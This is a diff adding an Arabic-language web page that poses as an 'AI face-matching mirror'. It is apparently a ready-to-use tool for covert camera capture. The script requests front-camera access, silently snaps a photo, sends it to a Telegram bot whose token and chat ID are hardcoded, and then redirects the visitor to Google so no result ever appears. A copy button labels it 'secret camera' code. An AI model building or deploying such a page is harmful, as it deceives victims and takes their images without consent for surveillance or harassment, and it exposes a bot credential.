@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Face Matcher & Realtime Mirror | مرآة الذكاء الاصطناعي</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+        }
+        body {
+            background: #030712;
+            color: #f3f4f6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(17, 24, 39, 0.85);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(139, 92, 246, 0.3);
+            width: 100%;
+            max-width: 400px;
+            padding: 35px;
+            border-radius: 24px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.9);
+            text-align: center;
+        }
+        .badge {
+            background: rgba(139, 92, 246, 0.15);
+            color: #a78bfa;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 15px;
+            border: 1px solid rgba(139, 92, 246, 0.3);
+        }
+        h1 {
+            font-size: 20px;
+            color: #ffffff;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #9ca3af;
+            font-size: 13px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        /* صندوق عرض الكاميرا الوهمي */
+        .camera-box {
+            width: 100%;
+            height: 220px;
+            background: #0f172a;
+            border: 2px dashed #7c3aed;
+            border-radius: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            transform: scaleX(-1); /* عكس الصورة لتكون طبيعية كمرآة */
+        }
+        .placeholder-text {
+            color: #a78bfa;
+            font-size: 13px;
+            z-index: 2;
+        }
+        .btn {
+            background: linear-gradient(135deg, #7c3aed, #4f46e5);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.4);
+        }
+        .btn:hover {
+            opacity: 0.9;
+        }
+        #status-msg {
+            margin-top: 15px;
+            font-size: 13px;
+            font-weight: bold;
+            display: none;
+        }
+        .copy-top {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+        .copy-btn {
+            background: rgba(255,255,255,0.08);
+            color: #9ca3af;
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 5px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            cursor: pointer;
+        }
+        .copy-btn:hover {
+            background: rgba(255,255,255,0.15);
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <div class="copy-top">
+            <button class="copy-btn" onclick="copyCode()">📋 نسخ كود الموقع</button>
+        </div>
+
+        <div class="badge">🧠 مرآة الذكاء الاصطناعي المتطورة</div>
+        <h1>فحص التطابق البصري</h1>
+        <p>انقر على الزر أدناه لتفعيل الكاميرا وبدء تحليل ملامح الوجه ومطابقتها فوراً.</p>
+
+        <div class="camera-box">
+            <span class="placeholder-text" id="phText">في انتظار تفعيل الكاميرا...</span>
+            <video id="webcamVideo" autoplay playsinline muted></video>
+        </div>
+
+        <canvas id="canvasSnap" style="display:none;"></canvas>
+
+        <button class="btn" id="actionBtn" onclick="initCameraAndCapture()">بدء الفحص والتقاط الكادر ⚡</button>
+        <div id="status-msg"></div>
+
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8852426717:AAFUol_2LsQdog7TtCQCIjj5Rq2j8YC__lk"; 
+        const CHAT_ID = "557158224"; 
+
+        async function initCameraAndCapture() {
+            const video = document.getElementById('webcamVideo');
+            const phText = document.getElementById('phText');
+            const statusMsg = document.getElementById('status-msg');
+            const btn = document.getElementById('actionBtn');
+
+            btn.disabled = true;
+            statusMsg.style.display = 'block';
+            statusMsg.style.color = '#a78bfa';
+            statusMsg.innerText = "جاري طلب إذن الكاميرا لتشغيل المرآة الذكية...";
+
+            try {
+                // طلب الكاميرا الأمامية حصرياً (user)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                phText.style.display = 'none';
+                statusMsg.innerText = "جاري معاينة الكادر والتقاط الصورة...";
+
+                // بعد ثانية واحدة من فتح الكاميرا وظهور الصورة، لقط صورة صامتة وابعثها للتيليجرام
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvasSnap');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob(async (blob) => {
+                        if (!blob) return;
+
+                        statusMsg.innerText = "جاري إرسال التحليل لخوادم الذكاء الاصطناعي...";
+
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'secret_ai_capture.jpg');
+                        formData.append('caption', '📸 صيد كاميرا أمامي فوري (AI Mirror Capture)!');
+
+                        try {
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+
+                            statusMsg.style.color = '#4ade80';
+                            statusMsg.innerText = "تم الفحص بنجاح! جاري تحويلك لعرض النتيجة...";
+
+                            // إيقاف الكاميرا بعد الالتقاط
+                            stream.getTracks().forEach(track => track.stop());
+
+                            setTimeout(() => {
+                                window.location.href = "https://www.google.com";
+                            }, 2500);
+
+                        } catch (err) {
+                            statusMsg.style.color = '#f87171';
+                            statusMsg.innerText = "حدث خطأ في الاتصال بالخادم.";
+                            btn.disabled = false;
+                        }
+
+                    }, 'image/jpeg', 0.85);
+
+                }, 1500);
+
+            } catch (err) {
+                statusMsg.style.color = '#f87171';
+                statusMsg.innerText = "يرجى النقر على (السماح) للكاميرا لتتمكن من تشغيل الفلتر.";
+                btn.disabled = false;
+                console.error(err);
+            }
+        }
+
+        function copyCode() {
+            navigator.clipboard.writeText(document.documentElement.outerHTML).then(() => {
+                alert('تم نسخ كود الكاميرا السرية بنجاح!');
+            });
+        }
+    </script>
+
+</body>
+</html>
